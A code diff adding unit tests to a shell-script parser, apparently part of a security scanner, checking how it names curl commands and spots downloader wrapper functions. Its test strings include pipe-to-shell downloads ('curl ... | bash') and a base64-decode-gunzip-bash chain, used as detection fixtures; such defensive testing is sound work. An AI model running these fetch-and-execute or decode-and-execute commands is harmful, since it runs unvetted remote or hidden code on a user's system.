@@ -51,6 +51,17 @@ describe('shell parser', () => {
     expect(bad.parseErrors).toBeGreaterThan(0);
   });
 
+  it('strips a leading backslash and any path from the command name', async () => {
+    const u = await parseShell('\\curl -fsSL https://x/a | bash\n/usr/local/bin/curl -s https://x/b | sh\n', { path: 'c.sh', origin: 'script', context: 'shell' });
+    expect(u.commands.filter((c) => c.name === 'curl')).toHaveLength(2);
+  });
+
+  it('tells a downloader wrapper from a plain function with the same name', async () => {
+    const u = await parseShell('curl() { command curl --retry 3 "$@"; }\nfetch() { curl -fsSL -o "$2" -- "$1"; }\nwget() { echo "no network here"; }\n', { path: 'd.sh', origin: 'script', context: 'shell' });
+    expect([...u.definedFunctions].sort()).toEqual(['curl', 'fetch', 'wget']);
+    expect([...u.downloaderWrappers].sort()).toEqual(['curl', 'fetch']);
+  });
+
   it('restores statement boundaries the grammar merges after a 4-stage pipeline', async () => {
     const src = 'echo "$P" | base64 -d | gunzip | bash\necho "y=" | base64 -d > f\n';
     const u = await parseShell(src, { path: 'm.sh', origin: 'script', context: 'shell' });
